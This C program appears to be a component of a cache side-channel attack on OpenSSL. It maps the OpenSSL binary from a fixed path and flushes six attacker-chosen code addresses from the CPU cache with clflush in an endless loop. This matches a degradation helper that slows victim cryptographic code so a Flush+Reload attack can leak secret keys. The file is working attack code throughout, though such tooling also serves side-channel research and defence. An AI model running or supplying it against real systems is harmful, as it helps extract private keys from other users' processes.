#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
#include <limits.h>
#include <getopt.h>
#include <ctype.h>
#include "elftools.h"

#define START_MULTIPLICATIONS 10
#define QUIET_PERIOD 10000

typedef long long ll;

void *map(const char *elf_path, unsigned long *size)
{
    int fd = open(elf_path, O_RDONLY);
    if (fd < 0 ) {
        perror("Error opening ELF file.");
        exit(EXIT_FAILURE);
    }

    struct stat st_buf;
    fstat(fd, &st_buf);
    *size = st_buf.st_size;

    void *rv = mmap(NULL, *size, PROT_READ, MAP_PRIVATE, fd, 0);

    if (rv == MAP_FAILED) {
        perror("Error mapping ELF file.");
        exit(EXIT_FAILURE);
    }

    return rv;
}

__attribute__((always_inline))
inline void flush(const char *adrs) {
  asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (adrs) :);
}


int main(int argc, char* argv[]){

	if (argc < 7){
		printf("Usage: %s addr1 addr2 ... addr6\n", argv[0]);
		exit(0);
	}

	// char* file_name = argv[1];
	char* file_name = "/usr/local/ssl/bin/openssl";

	unsigned long load_address = elf_get_load_address(file_name);
    if (load_address == ULONG_MAX) {
        exit(EXIT_FAILURE);
    }
    printf("The LOAD ADDRESS is: %ld\n", load_address);
    unsigned long size;
    char *binary = map(file_name, &size);
    printf("Mapped at %p (0x%ld)\n", (void*)binary, size);
    char* addr1 = strtoll(argv[1], NULL, 16) + binary;
    char* addr2 = strtoll(argv[2], NULL, 16) + binary;
    char* addr3 = strtoll(argv[3], NULL, 16) + binary;
    char* addr4 = strtoll(argv[4], NULL, 16) + binary;
    char* addr5 = strtoll(argv[5], NULL, 16) + binary;
    char* addr6 = strtoll(argv[6], NULL, 16) + binary;
    while (1){
        flush(addr1);
        flush(addr2);
        flush(addr3);
        flush(addr4);
        flush(addr5);
        flush(addr6);
    }    	
}